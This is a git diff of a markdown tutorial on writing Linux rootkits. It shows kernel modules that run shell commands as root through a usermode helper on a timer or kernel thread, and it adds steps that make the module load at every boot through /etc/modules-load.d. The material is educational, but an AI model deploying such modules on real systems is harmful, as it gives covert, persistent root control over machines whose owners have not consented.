@@ -1,6 +1,6 @@
-# ⚔️ Rootkits
+# Rootkits
 
-## 🤺Rootkit development
+## 🧑‍💻Rootkit development
 
 ### Requirements
 
@@ -66,7 +66,16 @@ So before going further you may notice some header files here and may ask that w
 
 ### EXPLAINATION
 
-- **This code as you can see prints the "Hello, Everyone!" in kernel logs to run this you can use the Makefile given below I got this from [xcellarator.github.io](http://xcellarator.github.io/)**
+- **This code as you can see prints the "Hello, Everyone!" in kernel logs to run this you can use the Makefile given below I used this from [xcellerator.github.io/posts/linux_rootkits_01/](http://xcellerator.github.io/posts/linux_rootkits_01/), I found this as really good resource to learn about rootkits**
+```
+obj-m += module_name.o
+
+all:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+```
 - **and then do run "make" command in the directory you've saved your Makefile and kernel program after making the kernel module successfully you can insert it in the kernel by running the following commands**
 - **before inserting you may clear kernel logs that are previously created**
 - **sudo dmesg -C**
@@ -89,10 +98,7 @@ So, To achieve this task we have to include few header files
 #include <linux/kernel.h>
 #include <linux/unistd.h>
 
-MODULE_AUTHOR("J3rry");
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("A kernel program that can execute commands");
-
 int command_executer(void){
         char *cmd_array[] = {"/bin/bash", "-c", "cmd1; cmd2; cmd3; cmdn;", NULL};
         char *env_variable[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
@@ -148,7 +154,7 @@ for that, we can add a timer to our previously created kernel program like a cro
 
 MODULE_AUTHOR("J3rry");
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("A kernel program that can print few texts in kernel logs in a certain time period");
+MODULE_DESCRIPTION("Description");
 
 static struct timer_list my_timer;//my_timer is a static variable of type struct timer_list
 void command_executer(void){
@@ -192,7 +198,7 @@ module_exit(remove);
 
 MODULE_AUTHOR("J3rry");
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("Another way to write texts in kernel log in a cetain time period");
+MODULE_DESCRIPTION("Description");
 
 static struct task_struct *my_thread;
 
@@ -245,7 +251,7 @@ after combining the code the code will look like this
 
 MODULE_AUTHOR("J3rry");
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("A kernel program that can execute few commands in certain time period");
+MODULE_DESCRIPTION("Description");
 
 static struct task_struct *my_thread;
 
@@ -291,8 +297,26 @@ module_init(initiate);
 module_exit(remove);
 ```
 
-# and finally just to make it work when we boots up the device again so follow these few steps
+# **and finally just to make it work when we boots up the device again so follow these few steps**
 
+***# add you kernel module to /lib/modules/$(uname -r)***
+
+```jsx
+sudo cp ~/kernel_module.ko /lib/modules/$(uname -r)
 ```
 
+***# now update the module dependencies by using the command***
+
+```jsx
+sudo depmod
 ```
+
+***# after updating module dependencies, create new config file in  /etc/modules by using the following command or can do that manually as well***
+
+```jsx
+echo "rk" | sudo tee /etc/modules-load.d/rk.conf
+```
+
+### document may be updated soon...
+
+## credits @xcellerator ("https://xcellarator.github.io") @f11snipe ("https://www.youtube.com/watch?v=f5lz8nGWht4&t=5024s&ab_channel=F11snipe")
